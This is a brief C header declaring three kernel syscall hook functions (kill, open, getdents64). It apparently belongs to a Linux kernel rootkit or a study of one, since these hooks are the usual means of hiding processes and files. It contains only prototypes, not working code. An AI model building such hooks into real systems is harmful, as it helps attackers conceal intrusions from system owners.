#pragma once

asmlinkage long hook_kill(pid_t pid, int sig);
asmlinkage long hook_open(const char __user *filename, int flags, umode_t mode);
asmlinkage long hook_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);